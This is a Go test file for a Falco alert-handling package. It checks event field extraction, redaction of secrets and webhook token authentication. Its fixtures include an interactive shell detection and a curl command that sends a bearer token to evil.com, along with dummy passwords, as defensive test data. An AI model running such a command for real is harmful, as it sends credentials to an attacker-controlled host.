package falco

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/kubebee-com/sre/pkg/scanner"
)

func TestFalcoEventExtraction(t *testing.T) {
	rawJSON := `{
		"output": "10:00:00.000: Warning Shell spawned in container (k8s.ns=prod-payments k8s.pod=payment-gateway-6b9c9f7b-9xz12 container=ab12cd34)",
		"priority": "Warning",
		"rule": "Terminal shell in container",
		"time": "2026-09-11T01:00:00Z",
		"output_fields": {
			"k8s.ns.name": "prod-payments",
			"k8s.pod.name": "payment-gateway-6b9c9f7b-9xz12",
			"container.id": "ab12cd34",
			"proc.cmdline": "/bin/bash -i"
		}
	}`

	ev, err := UnmarshalEvent([]byte(rawJSON))
	if err != nil {
		t.Fatalf("unexpected unmarshal error: %v", err)
	}

	if ev.Namespace() != "prod-payments" {
		t.Errorf("expected namespace prod-payments, got %q", ev.Namespace())
	}
	if ev.PodName() != "payment-gateway-6b9c9f7b-9xz12" {
		t.Errorf("expected pod name payment-gateway-6b9c9f7b-9xz12, got %q", ev.PodName())
	}
	if ev.ContainerID() != "ab12cd34" {
		t.Errorf("expected container id ab12cd34, got %q", ev.ContainerID())
	}
	if ev.ProcessName() != "/bin/bash -i" {
		t.Errorf("expected proc name /bin/bash -i, got %q", ev.ProcessName())
	}
	if ev.ScannerSeverity() != scanner.SeverityMedium {
		t.Errorf("expected SeverityMedium, got %v", ev.ScannerSeverity())
	}
	if ev.SuggestedRemediation() != "RestartPod" {
		t.Errorf("expected RestartPod remediation for shell, got %q", ev.SuggestedRemediation())
	}
}

func TestFalcoSanitization(t *testing.T) {
	ev := &Event{
		Output:   "User executed curl with Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeakThis and password=supersecretpass",
		Priority: PriorityCritical,
		Rule:     "Outbound network with credentials",
		Time:     time.Now(),
		OutputFields: map[string]interface{}{
			"proc.cmdline": "curl -H 'Authorization: Bearer secret_token_12345' https://evil.com",
			"proc.env": map[string]string{
				"DB_PASSWORD": "rootpassword123",
				"SAFE_VAR":    "production",
			},
		},
	}

	sanitized := SanitizeEvent(ev)
	if sanitized == nil {
		t.Fatal("expected non-nil sanitized event")
	}

	if strings.Contains(sanitized.Output, "supersecretpass") {
		t.Errorf("password was not sanitized from Output: %s", sanitized.Output)
	}
	cmdline := sanitized.OutputFields["proc.cmdline"].(string)
	if strings.Contains(cmdline, "secret_token_12345") {
		t.Errorf("secret token was not sanitized from cmdline: %s", cmdline)
	}
	envMap := sanitized.OutputFields["proc.env"].(map[string]string)
	if envMap["DB_PASSWORD"] == "rootpassword123" {
		t.Errorf("DB_PASSWORD was not sanitized from proc.env")
	}
	if envMap["SAFE_VAR"] != "production" {
		t.Errorf("SAFE_VAR was unexpectedly altered: %s", envMap["SAFE_VAR"])
	}
}

func TestFalcoWebhookAuthentication(t *testing.T) {
	secret := "test-secret-token-xyz"

	// 1. Missing token
	req := httptest.NewRequest(http.MethodPost, "/api/webhooks/falco", strings.NewReader(`{"rule":"test"}`))
	w := httptest.NewRecorder()
	_, err := ParseWebhookPayload(w, req, secret)
	if err != ErrUnauthorized {
		t.Fatalf("expected ErrUnauthorized for missing token, got %v", err)
	}

	// 2. Invalid token
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/falco", strings.NewReader(`{"rule":"test"}`))
	req.Header.Set("X-Falco-Token", "wrong-secret")
	w = httptest.NewRecorder()
	_, err = ParseWebhookPayload(w, req, secret)
	if err != ErrUnauthorized {
		t.Fatalf("expected ErrUnauthorized for wrong token, got %v", err)
	}

	// 3. Valid X-Falco-Token header
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/falco", strings.NewReader(`{"rule":"test","output":"alert in pod","priority":"Warning"}`))
	req.Header.Set("X-Falco-Token", secret)
	w = httptest.NewRecorder()
	events, err := ParseWebhookPayload(w, req, secret)
	if err != nil {
		t.Fatalf("unexpected error for valid token: %v", err)
	}
	if len(events) != 1 || events[0].Rule != "test" {
		t.Fatalf("expected 1 parsed event, got %+v", events)
	}

	// 4. Valid Bearer auth header
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/falco", strings.NewReader(`[{"rule":"batch-1"},{"rule":"batch-2"}]`))
	req.Header.Set("Authorization", "Bearer "+secret)
	w = httptest.NewRecorder()
	events, err = ParseWebhookPayload(w, req, secret)
	if err != nil {
		t.Fatalf("unexpected error for Bearer token: %v", err)
	}
	if len(events) != 2 {
		t.Fatalf("expected 2 parsed events in array, got %d", len(events))
	}

	// 5. Oversized payload rejected
	oversized := make([]byte, MaxWebhookPayloadBytes+10)
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/falco", bytes.NewReader(oversized))
	req.Header.Set("X-Falco-Token", secret)
	w = httptest.NewRecorder()
	_, err = ParseWebhookPayload(w, req, secret)
	if err == nil {
		t.Fatal("expected error on oversized payload, got nil")
	}
}
